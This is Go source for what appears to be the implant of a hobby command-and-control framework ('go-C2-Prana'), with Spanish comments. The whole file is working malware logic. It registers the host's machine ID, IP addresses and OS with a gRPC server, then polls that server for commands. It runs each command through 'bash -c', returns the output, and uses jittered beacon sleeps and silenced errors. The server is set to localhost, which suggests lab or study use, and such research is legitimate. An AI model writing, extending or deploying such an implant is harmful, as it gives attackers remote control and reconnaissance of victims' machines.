package main

import (
	"context"
	"github.com/denisbrodbeck/machineid"
	"github.dev/nireitdev/go-C2-Prana/internal/Task"
	"github.dev/nireitdev/go-C2-Prana/internal/common"
	proto2 "github.dev/nireitdev/go-C2-Prana/internal/proto"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/status"
	"log"
	"log/slog"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

const SLEEP_BEACON_SEG = 10

func main() {

	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	slog.SetDefault(logger)

	tasklist := Task.NewTaskList()
	go tasklist.PrintTaskListInfo()

	//Conexion al server:
	opts := grpc.DialOption(grpc.WithTransportCredentials(insecure.NewCredentials()))
	conn, err := grpc.NewClient("localhost:3000", opts)
	if err != nil {
		log.Fatalln("Imposible conectar con el servidor. Bye!")
	}
	defer conn.Close()

	srv := proto2.NewServerClient(conn)
	//Who I am?
	id, err := machineid.ID()
	if err != nil {
		//log.Fatal(err)  //Silent!!
	}
	ips := common.GetAddrs()
	os := runtime.GOOS

	//Its alive!
	srv.ImplantAlive(context.Background(), &proto2.AliveMsg{ImplantID: id, IpAddr: ips, OS: os})

	//Ejecuta tareas:
	go func() {
		for {
			for _, task := range tasklist.Tasks {
				if task.StatusRun != Task.WAITINGTORUN {
					continue
				}
				slog.Info("Running: ", "tarea", task)

				cmd := exec.Command("bash", "-c", task.Command)
				out, err := cmd.Output()
				//err = cmd.Run()
				if err != nil {
					log.Println(err)
					task.Result = ""
					task.StatusRun = Task.RUNNEDFAIL
				} else {
					log.Printf("Result: %s \n", out)
					// CUIDADO CON LOS ENCODINGS en el remote host!!
					task.Result = strings.ToValidUTF8(string(out), "_")
					task.StatusRun = Task.RUNNEDOK
				}

				tasklist.Tasks[task.TaskID] = task //update
			}

			time.Sleep(time.Duration(rand.Intn(SLEEP_BEACON_SEG)) * time.Second) //simulate beacon sleep + % jitter
		}
	}()

	//Recibo nuevas tareas:
	go func() {
		for {
			resp, err := srv.ImplantGetTask(context.Background(), &proto2.Empty{})
			if err != nil {
				log.Println("Fallo obtener nuevas tareas desde el servidor.")
			}

			//si no existe agrego la nueva tarea:
			if resp.Command != "" {
				if _, ok := tasklist.Tasks[resp.TaskID]; !ok {
					slog.Debug("Nueva tarea", "ID", resp.TaskID)
					ts := Task.NewTask(resp.TaskID, resp.ImplantID, resp.Command)
					ts.StatusRun = Task.WAITINGTORUN
					tasklist.Tasks[ts.TaskID] = *ts
				}
			}
			time.Sleep(time.Duration(rand.Intn(SLEEP_BEACON_SEG)) * time.Second) //simulate beacon sleep + % jitter
		}
	}()

	//Devuelve resultados al Servidor
	go func() {
		for {
			for _, task := range tasklist.Tasks {
				if task.StatusRun == Task.RUNNEDOK {
					resp := &proto2.Task{
						TaskID:    task.TaskID,
						ImplantID: task.ImplantID,
						Command:   task.Command,
						Status:    proto2.TaskStatus_NEWTASKOK, //FIXME: unificar los codigos de estado de los TASK
						Result:    task.Result,
					}
					_, err := srv.ImplantResultTask(context.Background(), resp)
					if err != nil {
						//reintentar el envio la proxima vez.
						slog.Debug("Error enviando resultados del Task al servidor")
						if status, ok := status.FromError(err); ok {
							slog.Error("RPC error: ", "MSG", status.Message())
						}
						continue
					}
					task.StatusRun = Task.SENDOK
					tasklist.Tasks[task.TaskID] = task
				}
				time.Sleep(time.Duration(rand.Intn(SLEEP_BEACON_SEG)) * time.Second) //simulate beacon sleep + % jitter
			}

		}

	}()

	time.Sleep(time.Duration(rand.Intn(SLEEP_BEACON_SEG)) * time.Second) //simulate beacon sleep + % jitter

	//FIXME: ctr+c, Sigterm, Sigkill etc:
	exit := make(chan bool)
	<-exit

}
